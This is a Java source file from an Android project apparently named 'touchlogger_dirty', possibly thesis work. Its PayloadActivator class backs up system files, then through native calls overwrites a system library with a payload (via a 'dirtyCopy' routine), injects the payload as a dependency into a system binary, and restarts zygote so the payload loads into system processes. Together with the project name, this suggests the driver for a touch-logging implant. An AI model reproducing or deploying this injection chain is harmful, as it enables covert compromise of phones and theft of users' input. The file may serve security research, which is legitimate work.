package org.leyfer.thesis.touchlogger_dirty.activation;

import android.util.Log;

import org.leyfer.thesis.touchlogger_dirty.activity.MainActivity;
import org.leyfer.thesis.touchlogger_dirty.utils.Config;
import org.leyfer.thesis.touchlogger_dirty.utils.JNIAPI;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import static org.leyfer.thesis.touchlogger_dirty.utils.Config.EXEC_PAYLOAD_NAME;
import static org.leyfer.thesis.touchlogger_dirty.utils.Config.SHARED_PAYLOAD_NAME;
import static org.leyfer.thesis.touchlogger_dirty.utils.Config.TARGET_BINARY_PATH;
import static org.leyfer.thesis.touchlogger_dirty.utils.Config.TARGET_INJECTED_PATH;
import static org.leyfer.thesis.touchlogger_dirty.utils.Config.TARGET_LIBRARY_NAME;
import static org.leyfer.thesis.touchlogger_dirty.utils.Config.TARGET_LIBRARY_PATH;

/**
 * Created by kirill on 19.03.17.
 */

public class PayloadActivator {

    private static final PayloadActivator ourInstance = new PayloadActivator();

    private String localPath;

    private Map<String, String> backupPaths = new HashMap<>();

    private PayloadActivator() {
    }

    public static PayloadActivator getInstance() {
        return ourInstance;
    }

    private void assertLocalPath() {
        if (localPath == null) {
            throw new RuntimeException("call setLocalPath() first!");
        }
    }

    private boolean createBackup(String originalPath, String backupPath) {
        if (backupPaths.get(originalPath) == null) {
            backupPaths.put(originalPath, backupPath);
        }

        return JNIAPI.nativeCopy(originalPath, backupPath);
    }

    private boolean backupTarget(String targetPath) {
        return createBackup(targetPath,
                new File(localPath, new File(targetPath).getName()).getAbsolutePath());
    }

    public boolean backupTargets() {
        assertLocalPath();
        if (!backupTarget(Config.TARGET_LIBRARY_PATH)
                || !backupTarget(Config.TARGET_BINARY_PATH)
                || !backupTarget(Config.TARGET_INJECTED_PATH)) {
            Log.w(MainActivity.TAG, "Unable to backup system files!");
            return false;
        }

        return true;
    }

    public boolean patchTargetLibrary() {
        assertLocalPath();
        File sharedPayloadFile = new File(localPath, SHARED_PAYLOAD_NAME);
        File execPayloadFile = new File(localPath, EXEC_PAYLOAD_NAME);
        if (sharedPayloadFile.exists() && execPayloadFile.exists()) {
            if (!JNIAPI.dirtyCopy(sharedPayloadFile.getAbsolutePath(),
                    TARGET_LIBRARY_PATH)) {
                Log.d(MainActivity.TAG,
                        String.format("Unable to replace %s!", TARGET_LIBRARY_PATH));
                return false;
            }

            if (!JNIAPI.injectDependencyIntoLinrary(TARGET_INJECTED_PATH,
                    TARGET_LIBRARY_NAME)) {
                Log.d(MainActivity.TAG, "Unable to inject dependency into system library!");

                // FIXME: REMOVE BEFORE PRODUCTION CODE!!!
                // <ONLY FOR TESTING!>
                if (!JNIAPI.replaceDependencyInBinary(TARGET_INJECTED_PATH, "libutils.so", TARGET_LIBRARY_NAME)) {
                    Log.d(MainActivity.TAG, "Unable to replace dependency!");
                    return false;
                } else {
                    Log.d(MainActivity.TAG, "Dependency replaced successfully!");
                    return true;
                }
                // </ONLY FOR TESTING!>
            }
        } else {
            Log.e(MainActivity.TAG, "Unable to access payload files!");
            return false;
        }

        return true;
    }

    public boolean restartZygote() {
        assertLocalPath();
        if (backupPaths.get(TARGET_BINARY_PATH) == null) {
            Log.d(MainActivity.TAG, "Unable to restart zygote! Check whether backup file is present!");
            return false;
        }

        JNIAPI.restartZygote(new File(localPath, SHARED_PAYLOAD_NAME).getAbsolutePath(),
                backupPaths.get(TARGET_BINARY_PATH));

        return true;
    }

    public void rollbackPatches() {

    }

    public void setLocalPath(String localPath) {
        this.localPath = localPath;
    }
}
